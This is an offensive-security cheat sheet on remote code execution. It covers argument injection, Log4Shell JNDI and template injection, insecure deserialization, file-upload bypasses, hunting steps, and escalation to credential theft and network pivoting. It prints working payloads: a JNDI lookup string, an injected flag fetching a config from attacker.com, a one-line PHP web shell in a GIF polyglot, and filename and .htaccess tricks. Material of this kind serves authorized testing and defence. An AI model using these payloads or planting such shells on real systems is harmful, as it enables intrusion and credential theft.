# Advanced Injection & RCE

## Mechanism Overview
Remote Code Execution (RCE) occurs when untrusted data is executed as a command, script, or object by the server. Modern RCE often bypasses standard filters via **Argument Injection**, **JNDI Injection**, or **Insecure Deserialization**.

## 1. High-Value Injection Vectors

### Argument Injection (The `--` Pattern)
*   **Mechanism:** User input is passed to a shell command (e.g., `git`, `curl`, `tar`).
*   **Failure:** Attacker injects flags (e.g., `--output=/tmp/pwned`, `--config-file=//attacker.com/evil.conf`) that reconfigure the command's behavior.
*   **Offensive Pivot:** Identify shell-outs to common CLI tools. Focus on applications that integrate with Git or handle archives.

### JNDI & Template Injection
*   **Mechanism:** Forcing a Java application to resolve a malicious URL via JNDI (e.g., Log4Shell) or triggering server-side template rendering (SSTI).
*   **Failure:** Trusting user input in log messages, search fields, or dynamic UI components.
*   **Audit Goal:** Inject `${jndi:ldap://{{COLLABORATOR}}/test}` and `{{7*7}}` in every header and parameter.

### Insecure Deserialization (Lifecycle Hijacking)
*   **Mechanism:** Trusting the reconstructed state of a serialized object (Java, PHP, Python).
*   **Failure:** Triggering "Magic Methods" (e.g., `readObject`, `__wakeup`) in dangerous classes present in the classpath (Gadget Chains).
*   **Audit Goal:** Identify serialization magic bytes (`rO0AB`, `O:8:`) in headers like `X-Mule-Session` or Cookies.

### Advanced File Upload to Web Shell (RCE)
*   **Mechanism:** Exploiting gaps between file validation and server-side execution context.
*   **Offensive Bypass Techniques:**
    1.  **MIME-Type Spoofing:** Change `Content-Type: application/x-php` $\rightarrow$ `Content-Type: image/jpeg` or `image/png`.
    2.  **Double & Alternative Extensions:**
        *   `shell.php.jpg`, `shell.jpg.php`, `shell.phtml`, `shell.php5`, `shell.phar`, `shell.inc`.
        *   Case insensitivity / trailing dots: `shell.PhP`, `shell.php.`, `shell.php%20`, `shell.php::$DATA` (Windows NTFS).
    3.  **Null Byte Poisoning:** `shell.php%00.jpg` or `shell.php\x00.png`.
    4.  **Path Traversal in Filename:**
        *   `filename="../../shell.php"` $\rightarrow$ Escape upload folder to public web root.
    5.  **Server Configuration Overwrite:**
        *   Upload `.htaccess` containing: `AddType application/x-httpd-php .jpg` or `SetHandler application/x-httpd-php`. Then upload `shell.jpg`.
        *   Upload `web.config` (IIS) mapping custom handlers.
    6.  **Polyglot Web Shells (GIF89a):** Prepending magic bytes `GIF89a;` followed by `<?php system($_GET['cmd']); ?>` to bypass image parser checks.

---


## 2. Tactical Hunting Methodology

1.  **Enumerate "Gateways":** Target VPN portals, Admin panels (Flink, Kibana), and Blockchain nodes for pre-auth RCE.
2.  **Fuzz Headers:** Inject Log4Shell and Template payloads in `User-Agent`, `X-Forwarded-For`, and `Referer`.
3.  **Audit Feature Logic:** Test Project Import/Export and Archive Uploads for symlink following and path traversal.
4.  **Analyze Dependencies:** Check for **Dependency Confusion** (internal package names registered on public registries).

## 3. Escalation Logic
*   **RCE** -> Shell Access -> Credential Extraction -> Internal Network Pivot (SSRF).
*   **SSTI** -> System Config Read -> Database Takeover.

## 4. Operational Checklist
*   Does the app shell out to CLI tools using user input?
*   Is Java/Apache/Rails used in the backend?
*   Are there any Base64 strings starting with `rO0AB`?
*   Can you inject flags into a backend process?
